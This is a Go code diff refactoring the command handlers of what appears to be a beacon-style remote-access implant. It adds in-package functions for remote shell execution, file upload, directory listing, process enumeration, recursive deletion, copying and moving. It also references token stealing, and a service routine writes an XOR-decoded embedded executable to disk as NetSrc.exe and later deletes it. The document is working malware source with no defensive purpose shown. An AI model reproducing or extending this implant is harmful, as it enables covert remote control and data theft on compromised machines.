@@ -3,10 +3,13 @@ package services
 import (
 	"bytes"
 	"crypto/rand"
+	"encoding/binary"
 	"encoding/hex"
 	"errors"
 	"fmt"
+	"github.com/shirou/gopsutil/process"
 	"io"
+	"io/ioutil"
 	"main/config"
 	"main/crypt"
 	"main/packet"
@@ -14,14 +17,56 @@ import (
 	"main/util"
 	"math/big"
 	"os"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
 	"time"
 )
 
+func ParseCommandShell(b []byte) (string, []byte, error) {
+	buf := bytes.NewBuffer(b)
+	pathLenBytes := make([]byte, 4)
+	_, err := buf.Read(pathLenBytes)
+	if err != nil {
+		return "", nil, err
+	}
+	pathLen := packet.ReadInt(pathLenBytes)
+	path := make([]byte, pathLen)
+	_, err = buf.Read(path)
+	if err != nil {
+		return "", nil, err
+	}
+
+	cmdLenBytes := make([]byte, 4)
+	_, err = buf.Read(cmdLenBytes)
+	if err != nil {
+		return "", nil, err
+	}
+
+	cmdLen := packet.ReadInt(cmdLenBytes)
+	cmd := make([]byte, cmdLen)
+	buf.Read(cmd)
+
+	envKey := strings.ReplaceAll(string(path), "%", "")
+	app := os.Getenv(envKey)
+	return app, cmd, nil
+}
+
+func ParseCommandUpload(b []byte) ([]byte, []byte) {
+	buf := bytes.NewBuffer(b)
+	filePathLenBytes := make([]byte, 4)
+	buf.Read(filePathLenBytes)
+	filePathLen := packet.ReadInt(filePathLenBytes)
+	filePath := make([]byte, filePathLen)
+	buf.Read(filePath)
+	fileContent := buf.Bytes()
+	return filePath, fileContent
+
+}
+
 func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
-	shellPath, shellBuf, err := packet.ParseCommandShell(cmdBuf)
+	shellPath, shellBuf, err := ParseCommandShell(cmdBuf)
 	if err != nil {
 		return nil, err
 	}
@@ -47,9 +92,9 @@ func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
 }
 
 func CmdUploadStart(cmdBuf []byte) ([]byte, error) {
-	filePath, fileData := packet.ParseCommandUpload(cmdBuf)
+	filePath, fileData := ParseCommandUpload(cmdBuf)
 	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
-	result, err := packet.Upload(filePathStr, fileData)
+	result, err := Upload(filePathStr, fileData)
 	if err != nil {
 		return nil, err
 	}
@@ -57,13 +102,26 @@ func CmdUploadStart(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdUploadLoop(cmdBuf []byte) ([]byte, error) {
-	filePath, fileData := packet.ParseCommandUpload(cmdBuf)
+	filePath, fileData := ParseCommandUpload(cmdBuf)
 	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
-	result, err := packet.Upload(filePathStr, fileData)
+	result, err := Upload(filePathStr, fileData)
 	if err != nil {
 		return nil, err
 	}
 	return result, nil
+}
+
+func Upload(filePath string, fileContent []byte) ([]byte, error) {
+	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
+	if err != nil {
+		return nil, errors.New("file create err: " + err.Error())
+	}
+	defer fp.Close()
+	offset, err := fp.Write(fileContent)
+	if err != nil {
+		return nil, errors.New("file write err: " + err.Error())
+	}
+	return []byte("success, the offset is: " + strconv.Itoa(offset)), nil
 }
 
 func CmdDownload(cmdBuf []byte) ([]byte, error) {
@@ -111,11 +169,89 @@ func CmdDownload(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdFileBrowse(cmdBuf []byte) ([]byte, error) {
-	return packet.File_Browse(cmdBuf)
+	buf := bytes.NewBuffer(cmdBuf)
+	//resultStr := ""
+	pendingRequest := make([]byte, 4)
+	dirPathLenBytes := make([]byte, 4)
+
+	_, err := buf.Read(pendingRequest)
+	if err != nil {
+		return nil, err
+	}
+	_, err = buf.Read(dirPathLenBytes)
+	if err != nil {
+		return nil, err
+	}
+
+	dirPathLen := binary.BigEndian.Uint32(dirPathLenBytes)
+	dirPathBytes := make([]byte, dirPathLen)
+	_, err = buf.Read(dirPathBytes)
+	if err != nil {
+		return nil, err
+	}
+
+	// list files
+	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
+	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")
+
+	// build string for result
+	/*
+	   /Users/xxxx/Desktop/dev/deacon/*
+	   D       0       25/07/2020 09:50:23     .
+	   D       0       25/07/2020 09:50:23     ..
+	   D       0       09/06/2020 00:55:03     cmd
+	   D       0       20/06/2020 09:00:52     obj
+	   D       0       18/06/2020 09:51:04     Util
+	   D       0       09/06/2020 00:54:59     bin
+	   D       0       18/06/2020 05:15:12     config
+	   D       0       18/06/2020 13:48:07     crypt
+	   D       0       18/06/2020 06:11:19     Sysinfo
+	   D       0       18/06/2020 04:30:15     .vscode
+	   D       0       19/06/2020 06:31:58     packet
+	   F       272     20/06/2020 08:52:42     deacon.csproj
+	   F       6106    26/07/2020 04:08:54     Program.cs
+	*/
+	fileInfo, err := os.Stat(dirPathStr)
+	if err != nil {
+		return nil, err
+	}
+	modTime := fileInfo.ModTime()
+	currentDir := fileInfo.Name()
+
+	absCurrentDir, err := filepath.Abs(currentDir)
+	if err != nil {
+		return nil, err
+	}
+	modTimeStr := modTime.Format("02/01/2006 15:04:05")
+	resultStr := ""
+	if dirPathStr == "./" {
+		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
+	} else {
+		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
+	}
+	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
+	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
+	files, err := ioutil.ReadDir(dirPathStr)
+	for _, file := range files {
+		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")
+
+		if file.IsDir() {
+			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
+		} else {
+			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
+		}
+	}
+
+	return util.BytesCombine(pendingRequest, []byte(resultStr)), nil
+
 }
 
 func CmdCd(cmdBuf []byte) ([]byte, error) {
-	return packet.ChangeCurrentDir(cmdBuf)
+	err := os.Chdir(string(cmdBuf))
+	if err != nil {
+		return nil, err
+	}
+	return []byte("changing directory success"), nil
 }
 
 func CmdSleep(cmdBuf []byte) ([]byte, error) {
@@ -128,7 +264,12 @@ func CmdSleep(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdPwd() ([]byte, error) {
-	return packet.GetCurrentDirectory()
+	pwd, err := os.Getwd()
+	result, err := filepath.Abs(pwd)
+	if err != nil {
+		return nil, err
+	}
+	return []byte(result), nil
 }
 
 func CmdPause(cmdBuf []byte) ([]byte, error) {
@@ -154,7 +295,11 @@ func CmdExecute(cmdBuf []byte, Token uintptr) ([]byte, error) {
 }
 
 func CmdGetUid() ([]byte, error) {
-	return packet.GetUid()
+	result, err := sysinfo.GetUsername()
+	if err != nil {
+		return nil, err
+	}
+	return []byte(result), nil
 }
 
 func CmdGetPrivs(b []byte, token uintptr) ([]byte, error) {
@@ -177,7 +322,51 @@ func CmdStealToken(cmdBuf []byte) (uintptr, []byte, error) {
 }
 
 func CmdPs(cmdBuf []byte) ([]byte, error) {
-	return packet.ListProcess(cmdBuf)
+	/*err := enableSeDebugPrivilege()
+	if err != nil {
+		fmt.Println("SeDebugPrivilege Wrong.")
+	}*/
+	buf := bytes.NewBuffer(cmdBuf)
+	//resultStr := ""
+	pendingRequest := make([]byte, 4)
+	_, err := buf.Read(pendingRequest)
+	if err != nil {
+		return nil, err
+	}
+
+	processes, err := process.Processes()
+	if err != nil {
+		return nil, err
+	}
+	result := fmt.Sprintf("\n%s\t\t\t%s\t\t\t%s\t\t\t%s\t\t\t%s", "Process Name", "pPid", "pid", "Arch", "User")
+	for _, p := range processes {
+		pid := p.Pid
+		parent, _ := p.Parent()
+		if parent == nil {
+			continue
+		}
+		pPid := parent.Pid
+		name, _ := p.Name()
+		owner, _ := p.Username()
+		sessionId := sysinfo.GetProcessSessionId(pid)
+		var arc bool
+		var archString string
+		IsX64, err := sysinfo.IsPidX64(uint32(pid))
+		if err != nil {
+			return nil, err
+		}
+		if arc == IsX64 {
+			archString = "x64"
+		} else {
+			archString = "x86"
+		}
+
+		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
+	}
+
+	//return append(b,[]byte(result)...)
+	//return []byte(result), nil
+	return util.BytesCombine(pendingRequest, []byte(result)), nil
 }
 
 func CmdKill(cmdBuf []byte) ([]byte, error) {
@@ -186,7 +375,25 @@ func CmdKill(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdMkdir(cmdBuf []byte) ([]byte, error) {
-	return packet.Mkdir(cmdBuf)
+	if PathExists(string(cmdBuf)) {
+		return nil, errors.New("Directory exists")
+	}
+	err := os.Mkdir(string(cmdBuf), os.ModePerm)
+	if err != nil {
+		return nil, errors.New("Mkdir failed")
+	}
+	return []byte("Mkdir success: " + string(cmdBuf)), nil
+}
+
+func PathExists(path string) bool {
+	_, err := os.Stat(path)
+	if err == nil {
+		return true
+	}
+	if os.IsNotExist(err) {
+		return false
+	}
+	return false
 }
 
 func CmdDrives(cmdBuf []byte) ([]byte, error) {
@@ -194,15 +401,61 @@ func CmdDrives(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdRm(cmdBuf []byte) ([]byte, error) {
-	return packet.Remove(cmdBuf)
+	Path := strings.ReplaceAll(string(cmdBuf), "\\", "/")
+	err := os.RemoveAll(Path)
+	if err != nil {
+		return nil, errors.New("Remove failed")
+	}
+	return []byte("Remove " + string(cmdBuf) + " success"), nil
 }
 
 func CmdCp(cmdBuf []byte) ([]byte, error) {
-	return packet.Copy(cmdBuf)
+	buf := bytes.NewBuffer(cmdBuf)
+	arg, err := util.ParseAnArg(buf)
+	if err != nil {
+		return nil, err
+	}
+	src := string(arg)
+	arg, err = util.ParseAnArg(buf)
+	if err != nil {
+		return nil, err
+	}
+	dest := string(arg)
+	bytesRead, err := ioutil.ReadFile(src)
+	if err != nil {
+		return nil, err
+	}
+	fp, err := os.OpenFile(dest, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
+	if err != nil {
+		return nil, err
+	}
+	defer fp.Close()
+	_, err = fp.Write(bytesRead)
+	if err != nil {
+		return nil, err
+	}
+
+	return []byte("Copy " + src + " to " + dest + " success"), nil
 }
 
 func CmdMv(cmdBuf []byte) ([]byte, error) {
-	return packet.Move(cmdBuf)
+	buf := bytes.NewBuffer(cmdBuf)
+	arg, err := util.ParseAnArg(buf)
+	if err != nil {
+		return nil, err
+	}
+	src := string(arg)
+	arg, err = util.ParseAnArg(buf)
+	if err != nil {
+		return nil, err
+	}
+	dest := string(arg)
+	err = os.Rename(src, dest)
+	if err != nil {
+		return nil, err
+	}
+
+	return []byte("Move " + src + " to " + dest + " success"), nil
 }
 
 func CmdRun2self(Token uintptr) (uintptr, []byte, error) {
@@ -423,12 +676,12 @@ func CmdService(Token uintptr) ([]byte, error) {
 	encoded, _ := hex.DecodeString(hexEncoded)
 	data := crypt.XOR(encoded, []byte("key"))
 	data = bytes.ReplaceAll(data, []byte("f\x00l\x00a\x00g\x00"), crypt.RandomBytes(8))
-	path, _ := packet.GetCurrentDirectory()
+	path, _ := CmdPwd()
 	filePath := string(path) + "\\NetSrc.exe"
 	currentFile, _ := os.Executable()
 
 	go func() {
-		_, err := packet.Upload(filePath, data)
+		_, err := Upload(filePath, data)
 		if err != nil {
 			packet.ErrorProcess(err)
 			return
@@ -460,7 +713,7 @@ func CmdService(Token uintptr) ([]byte, error) {
 			return
 		}
 
-		_, err = packet.Remove([]byte(filePath))
+		_, err = CmdRm([]byte(filePath))
 		if err != nil {
 			packet.ErrorProcess(err)
 			return
